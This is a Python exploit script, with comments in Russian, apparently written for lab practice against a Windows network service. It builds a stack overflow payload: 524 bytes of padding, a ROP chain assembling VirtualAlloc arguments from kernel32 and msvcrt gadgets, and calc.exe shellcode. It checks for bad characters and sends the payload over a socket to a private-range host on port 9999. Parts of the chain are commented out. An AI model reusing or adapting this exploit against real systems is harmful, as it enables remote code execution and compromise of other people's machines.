import struct

class OffsetPacker:
    def __init__(self, base):
        self.base = base
    
    def __call__(self, offset):
        return struct.pack('<I', self.base + offset)

# Создаю упаковщики для разных модулей
# Указываю Base Address
kernel32_p32 = OffsetPacker(base=0x76C00000)
msvcrt_p32 =   OffsetPacker(base=0x76830000)
#ws2_32_p32 = OffsetPacker(base=0x776E0000)

# Обычная упаковка
def p32(x): return struct.pack('<I', x)

# Базовые константы
OFFSET = 524
ADDR_VA = kernel32_p32(0x137C0)       # offset для VirtualAlloc
ADDR_JMP_ESP = 0x311712F3             # Адрес jmp esp для выполнения кода в стеке
ROP_NOP = 0x3117124c                  # ret


# Шеллкод для запуска calc.exe (пример)
shellcode = b'\x90' * 16 + \
b'\xdb\xc3\xd9\x74\x24\xf4\x5b\x33\xc9\xb1\x33\xba\xa5' \
b'\x0b\x9e\x3b\x31\x53\x18\x83\xc3\x04\x03\x53\xb0\x2b' \
b'\x4d\xd6\x20\x2e\xae\x27\xb1\x4f\x26\xc2\x80\x5f\x3c' \
b'\x86\xb2\x6f\x36\xca\x3e\x1b\x1a\xff\xb5\x69\xb3\xf0' \
b'\x7e\xc7\xe5\x3f\x7f\x64\x09\x21\x03\x77\x5e\x81\x3a' \
b'\xb8\x93\x40\x7b\xa5\x5e\x10\xd4\xa1\xcd\x85\x51\xff' \
b'\xcd\x2e\x29\x11\x56\xd2\xf9\x10\x77\x45\x72\x4b\x57' \
b'\x67\x57\xe7\xde\x7f\xb4\xc2\xa9\x0c\x0e\xb8\x28\xc4' \
b'\x5f\x41\x86\x29\x50\xb0\xd6\x6e\x47\x2b\xad\x86\xa4'


#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       => Return Address (Call to ESP) #
#   _In_      SIZE_T dwSize,          => dwSize (0x1)                 #
#   _In_      DWORD flAllocationType, => flAllocationType (0x1000)    #
#   _In_      DWORD flProtect         => flProtect (0x40)             #
# );                                                                  #
#---------------------------------------------------[Register Layout]-#
# Remember (1) the  stack  grows  downwards  so we  need to load the  #
# values into the registers in reverse order! (2) We are going to do  #
# some clever  trickery to  align our  return after  executing.  To   #
# acchieve this we will be filling EDI with a ROP-Nop and we will be  #
# skipping ESP leaving it intact.                                     #
#                                                                     #
# EAX 90909090 => Nop                                                 #
# ECX 00000040 => flProtect                                           #
# EDX 00001000 => flAllocationType                                    #
# EBX 00000001 => dwSize                                              #
# ESP ???????? => Leave as is                                         #
# EBP ???????? => Call to ESP (jmp, call, push,..)                    #
# ESI ???????? => PTR to VirtualAlloc - DWORD PTR of ADDR_VA          #
# EDI 3117124C => ROP-Nop same as EIP                                 #
#---------------------------------------------------------------------#

# Nop rop
nop = kernel32_p32(0x18FAF)                     # pop eax ; ret
nop += p32(0x90909090)                          # EAX 90909090 => Nop
nop += msvcrt_p32(0x26f14)                      # push eax ; ret

# flProtect rop
flProtect = kernel32_p32(0x17130)               # xor eax, eax ; ret => 0x00000000
flProtect += msvcrt_p32(0x7f713)                # add eax, 0x60 ; ret
flProtect += msvcrt_p32(0x6c061)                # add eax, -0x20 ; pop ebp ; ret
flProtect += msvcrt_p32(0x26f14)                # push eax ; ret => 0x00000040

# flAllocationType rop
flAllocationType = kernel32_p32(0x18FAF)        # pop eax ; ret
flAllocationType += p32(0xE58BEFFE)             # Bitwise Calc => E58BEFFE
flAllocationType += msvcrt_p32(0x270d3)         # xor eax, 0xe58bfffe ; pop ebp ; ret => EAX 0x00001000
flAllocationType += p32(0x44444444)             # EBP 43434343 => padding for pop ebp
flAllocationType += msvcrt_p32(0x26f14)         # push eax ; ret => 0x00001000

# dwSize rop
dwSize = kernel32_p32(0x18FAF)                  # pop eax ; ret
dwSize += p32(0xE58BFFFF)                       # Bitwise Calc => E58BFFFF
dwSize += msvcrt_p32(0x270d3)                   # xor eax, 0xe58bfffe ; pop ebp ; ret => EAX 0x00000001
dwSize += p32(0x43434343)                       # EBP 43434343 => padding for pop ebp
dwSize += msvcrt_p32(0x26f14)                   # push eax ; ret => 0x00000001

# lpAddress rop =>    Return Address (Redirect Execution to ESP)
lpAddress = kernel32_p32(0x18FAF)               # pop eax ; ret
lpAddress += p32(ADDR_JMP_ESP)                  # 0x311712F3 => jmp esp
lpAddress += msvcrt_p32(0x26f14)                # push eax ; ret

# VirtualAlloc address
vaAddress = kernel32_p32(0x18FAF)               # pop eax ; ret
vaAddress += ADDR_VA                            #
vaAddress += msvcrt_p32(0x26f14)                # push eax ; ret

# rop combine
rop = nop + flProtect #+ flAllocationType + dwSize + lpAddress + vaAddress


payload = b'A' * OFFSET             # buf fill 520 + EBP затирание 4 байт в 32
#payload += p32(ADDR_JMP_ESP)        # jmp esp
payload += rop                      # Setting Registers For VirtualAlloc
#payload += p32(ADDR_JMP_ESP)        # jmp esp
#payload += ADDR_VA                  # EIP → VirtualAlloc
payload += b'C' * 36                # Temp Stack Data 4 test only



# Проверки:
badchars = [b'\x00', b'\x0a', b'\x0d', b'\x09']
assert len(payload) <= 1000
assert not any(bad in payload for bad in badchars), \
       f'Payload contains one of badchars: {badchars!r}'


# Отправка
import socket
s = socket.create_connection(('192.168.56.113', 9999))
s.send(payload)
s.close()
